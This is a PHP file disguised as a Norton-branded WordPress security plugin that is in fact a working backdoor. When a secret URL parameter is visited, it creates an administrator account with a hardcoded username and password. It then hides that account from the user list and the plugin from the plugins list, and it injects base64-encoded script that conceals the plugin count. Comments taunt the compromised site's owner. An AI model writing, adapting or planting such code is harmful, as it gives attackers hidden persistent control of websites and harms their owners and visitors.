<?php
// Bro, it's too late. I don't know why you want discover which code hacked your ugly website. Don't be stupid in the future.

// Alternative plugin information

// Plugin Name: Norton™ Security - WordPress Total Protection
// Plugin URI: https://www.norton.com/
// Description: Stop hackers from exploiting your business data, thanks to our solution for unmatched threat detection.
// Author: Norton™, Emilio "LESiO" Savoie
// Version: 4.3.5
// Author URI: https://www.norton.com/

// These following lines will create admin account when "example.com?5394552785=BACKDOOR" is opened.
// Login : Hacked_By_LESiO
// Password : 1TSN0TWYR3VLPV55M0RD

add_action('wp_head', 'Backdoor');

function Backdoor() {
	if ($_GET['5394552785'] == 'BACKDOOR') {
		require('wp-includes/registration.php');
		if (!username_exists('Hacked_By_LESiO')) {
			$user_id = wp_create_user('Hacked_By_LESiO', '1TSN0TWYR3VLPV55M0RD');
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}

// Hide the administrator account from the users list.

add_action('pre_user_query','Ghost_Backdoor');

function Ghost_Backdoor($user_search) {
	global $current_user;
	$username = $current_user->user_login;

	if ($username == 'Hacked_By_LESiO') {
	}

	else {
	global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
	"WHERE 1=1 AND {$wpdb->users}.user_login != 'Hacked_By_LESiO'",$user_search->query_where);
	}
}

// Hide the plugin from the plugins list.

add_action('pre_current_active_plugins', 'Ghost_Plugin');

function Ghost_Plugin() {
	global $wp_list_table;
	$hidearr = array('norton-security-wordpress/norton-security-wordpress.php');
	$myplugins = $wp_list_table->items;
	foreach ($myplugins as $key => $val) {
	if (in_array($key,$hidearr)) {
		unset($wp_list_table->items[$key]);
		}
	}
}

function Disable_Plugin_Counter() {
	echo(base64_decode('PHNjcmlwdD4oZnVuY3Rpb24oJCl7JChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKXskKCcud3JhcCBzcGFuLmNvdW50JykuaGlkZSgpO30pO30pKGpRdWVyeSk7PC9zY3JpcHQ+'));
}

// The creator of this code is also a web developer. Maybe he can do something for your ugly website.
// Contact me at lesio@tutanota.com
?>
